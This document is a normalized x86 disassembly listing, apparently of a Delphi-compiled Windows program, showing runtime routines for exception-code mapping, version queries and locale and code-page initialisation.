jmp r-xdata
add esp 0x444
retn
sub_40bc28
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_403ff8
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_40bc64
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40bcbe
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_4092bc
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403ff8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bcc5
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
add esp 0xfffffff0
call sub_403578
sub_40bcc5
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_40bce4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_405ecc
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_40bd20
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40bd8c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_405ecc
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_4092bc
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403ff8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bd93
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc8
retn
add esp 0xfffffff0
call sub_403578
sub_40bd93
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_40bdb4
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_403ff8
mov eax [ ebp + 0x8 ]
mov [ edi + 0x8 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_40be28
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_4029a0
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd20
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40be89
mov esi 0xa0e0040
push esp
inc ebp
js r-xdata
jpe r-xdata
jo r-xdata
[ ebx - 0x3d ]
mov eax eax
loopne r-xdata
push edx
je r-xdata
pop ebp
cld
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40bf98
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
pop es
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + edx ] al
inc eax
add [ eax + eax ] al
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_40403c
jmp r-xdata
push ebx
mov eax edx
jmp sub_4039e0
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x16
jb r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc64
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bf9f
lea eax [ ebp - 0x20 ]
call sub_403fa4
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
and eax 0xff
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40bc28
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_40be28
mov edx eax
sub_40befc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40bf98
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_40403c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc64
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bf9f
lea eax [ ebp - 0x20 ]
call sub_403fa4
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_40bfec
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_40c084
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40c23f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc64
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_404214
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_408a84
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc64
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c246
lea eax [ ebp - 0x170 ]
call sub_403fa4
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_403fc8
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_40c250
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40c30b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40bfec
and eax 0xff
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40bc28
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
push ebp
call sub_40c084
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c312
lea eax [ ebp - 0x10 ]
call sub_403fa4
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc64
mov ebx eax
sub_40c32c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_40c31c
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_40c06c
mov eax [ rw-data ]
mov [ eax ] sub_40c250
mov eax sub_40bfb8
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40bfd4
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_40c3b0
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
retn
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_403254
xor eax eax
mov [ rw-data ] eax
sub_40c430
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_404214
sub_40c4c0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_40c596
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_40403c
lea eax [ ebp - 0x8 ]
call j_sub_404470
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_404464
push eax
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c59d
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
mov eax ebx
call sub_4027c4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_40c579
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_404464
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4027e4
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
sub_40c5ac
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
mov al [ eax ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
mov cl [ eax + esi ]
and ecx 0xff
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
mov al [ eax + edi ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_40c624
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_404464
mov edx esi
dec edx
call sub_40c5ac
sub_40c660
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404264
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_40c688
pop esi
pop ebx
retn
mov eax ebx
call sub_404264
mov esi eax
sub_40c688
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_404264
cmp esi eax
jg r-xdata
mov edi esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
xor edi edi
cmp esi eax
jl r-xdata
mov dl [ ebx + eax - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
inc eax
mov edx eax
mov eax ebx
call sub_40c898
jmp r-xdata
inc edi
cmp esi eax
jge r-xdata
sub_40c6e0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
call sub_404264
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40c898
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40c898
dec eax
mov ebx eax
sub_40c770
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_404264
cmp ebx eax
jg r-xdata
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
dec edx
mov eax esi
call sub_40c6e0
dec ebx
cmp ebx [ esp + 0x4 ]
jg r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_404264
cmp eax [ esp ]
jg r-xdata
inc [ esp ]
jmp r-xdata
sub_40c7d4
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_404264
cmp ebx eax
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
call sub_404264
mov ebx eax
mov [ esp ] ebx
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax esi
call sub_40c6e0
mov eax esi
call sub_404264
cmp eax [ esp ]
jge r-xdata
mov eax esi
call sub_404264
mov [ esp ] eax
jmp r-xdata
sub_40c85c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ ebx + esi - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_404464
add eax esi
dec eax
call sub_40c834
sub_40c898
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_404464
add eax ebx
dec eax
call sub_40c834
add eax ebx
sub_40c8d4
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_404264
cmp ebx eax
jg r-xdata
cmp [ esi + ebx - 0x1 ] 0x5c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c624
test al al
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_40c908
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebp eax
xor ebx ebx
test edi edi
jle r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_404264
cmp edi eax
jg r-xdata
mov edx edi
mov eax esi
call sub_40c624
test al al
jne r-xdata
mov eax ebp
call sub_404464
mov dl [ esi + edi - 0x1 ]
call sub_408d64
test eax eax
setne bl
sub_40c94c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_404464
push eax
mov eax esi
call sub_404464
mov ebp eax
mov eax ebp
pop edx
call sub_40ca10
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_40c984
push ebx
push esi
push edi
push ebp
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_40822c
mov eax esi
call sub_404264
mov ebp eax
mov eax edi
mov edx ebp
call sub_4045f0
mov ebx 0x1
cmp ebp ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call j_sub_404470#2
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ edi ]
mov al [ eax + ebx - 0x1 ]
add al 0xbf
sub al 0x1a
jae r-xdata
inc ebx
mov eax edi
call j_sub_404470#2
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
jmp r-xdata
inc ebx
cmp ebp ebx
jge r-xdata
mov eax edi
call j_sub_404470#2
add [ eax + ebx - 0x1 ] 0x20
jmp r-xdata
sub_40ca10
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_408bb4
mov [ esp ] eax
mov eax ebp
call sub_408bb4
mov edi eax
mov edx ebp
mov eax esi
call sub_408d78
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_40c648
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_408d78
mov ebx eax
inc ebx
sub_40cab0
push ebx
push esi
mov ebx edx
mov edx ebx
call sub_40cad8
mov esi eax
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov esi eax
inc eax
mov edx ebx
call sub_40cad8
test eax eax
jne r-xdata
sub_40cad8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_408d64
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_40c648
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
call sub_408d64
mov edi eax
test edi edi
jne r-xdata
sub_40cb18
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
xor edx edx
push ebp
push sub_40cb7c
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0x7 ]
push edx
push 0x1004
push eax
call GetLocaleInfoA
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0x7 ]
mov ecx 0x7
call sub_404214
mov eax [ ebp - 0xc ]
push eax
call GetACP
mov edx eax
pop eax
call sub_408580
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cb83
lea eax [ ebp - 0xc ]
call sub_403fa4
retn
sub_40cb8c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
mov eax [ rw-data ]
call sub_40cb18
push eax
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov al [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
mov al [ edi + esi + 0x6 ]
mov bl [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
and eax 0xff
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_40cc04
push ebp
mov ebp esp
add esp 0xfffffe68
push ebx
push esi
push edi
mov [ rw-data ] 0x409
mov [ rw-data ] 0x9
mov [ rw-data ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ rw-data ] eax
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
cmp [ rw-data ] 0x2
jne r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ rw-data ] edx
movzx eax ax
shr eax 0xa
mov [ rw-data ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ rw-data ] al
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
call sub_40cbec
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_40cb8c
pop ecx
push ebp
call sub_40cb8c
pop ecx
mov eax rw-data
mov edx r-xdata
mov cl 0x20
call sub_402d8c
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
jmp r-xdata
mov eax 0x80
lea edx [ ebp - 0x94 ]
mov [ rw-data ] 0x0
jmp r-xdata
mov [ edx ] al
inc eax
inc edx
cmp eax 0x100
jne r-xdata
lea eax [ ebp - 0x94 ]
lea edx [ ebp - 0x196 ]
push edx
push 0x80
push eax
push 0x2
mov eax [ rw-data ]
push eax
call GetStringTypeExA
mov eax 0x80
lea edx [ ebp - 0x196 ]
add edx 0x2
dec eax
jne r-xdata
cmp [ edx ] 0x2
sete cl
mov [ rw-data ] cl
test cl cl
jne r-xdata
jmp r-xdata
sub_40cd78
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_40d043
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40cc04
call sub_40b510
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_40b460
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403ff8
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_40b460
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_408580
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_40b460
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_408580
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_40b4ac
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_40b4ac
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_40b460
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_408580
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_40b4ac
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_40b460
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40b798
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_403ff8
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_40b460
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_40b798
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_403ff8
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_40b4ac
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_40b460
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_403ff8
